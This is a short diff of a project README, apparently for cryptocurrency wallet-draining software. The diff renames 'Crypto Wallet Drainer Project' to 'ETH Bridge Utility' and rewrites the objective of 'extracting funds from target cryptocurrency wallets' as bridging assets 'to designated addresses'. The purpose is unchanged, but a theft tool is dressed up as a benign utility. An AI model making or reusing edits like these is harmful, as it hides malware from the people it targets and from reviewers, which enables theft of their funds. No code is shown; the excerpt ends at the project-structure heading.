@@ -1,7 +1,7 @@
-# Crypto Wallet Drainer Project
+# ETH Bridge Utility
 
 ## Main Objective
-Crypto wallet draining - extracting funds from target cryptocurrency wallets
+Bridge assets from cryptocurrency wallets to designated addresses
 
 ## Project Structure
 ```
